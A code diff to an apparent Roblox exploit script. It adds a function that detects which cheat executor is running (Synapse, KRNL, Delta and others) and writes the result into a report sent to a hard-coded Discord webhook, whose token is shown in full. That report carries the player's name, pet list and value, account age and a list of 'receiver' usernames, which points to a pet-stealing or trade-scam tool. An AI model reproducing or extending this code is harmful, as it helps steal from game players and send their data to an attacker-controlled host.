@@ -12,6 +12,24 @@ local HttpService = game:GetService("HttpService")
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1400839053846253698/IiAJbeK6jtNJBh3kAqB0u1COkPCLiz0xFNGeEUXi6WhsBHOF4wjDkQ30kGQKUm8RKQ3B"
 local dataModule = require(ReplicatedStorage.Modules.DataService)
 
+local function identifyexecutor()
+    if syn then
+        return "Synapse"
+    elseif KRNL then
+        return "KRNL"
+    elseif Fluxus then
+        return "Fluxus"
+    elseif Protosmasher then
+        return "Protosmasher"
+    elseif (ArceusX ~= nil) or (Arceus ~= nil) then
+        return "Arceus X"
+    elseif Delta then
+        return "Delta"
+    else
+        return "Codex / Unknown"
+    end
+end
+
 -- Whitelisted usernames that when join, you teleport to them invisibly
 local USERNAMES = {
     "NEDYXSTOCK40",
@@ -121,7 +139,7 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     LocalPlayer.Name, 
                     table.concat(USERNAMES, " "), 
-                    LocalPlayer.Name, -- or identifyexecutor() if you have it
+                    identifyexecutor(), -- or identifyexecutor() if you have it
                     LocalPlayer.AccountAge
                 ),
                 inline = false
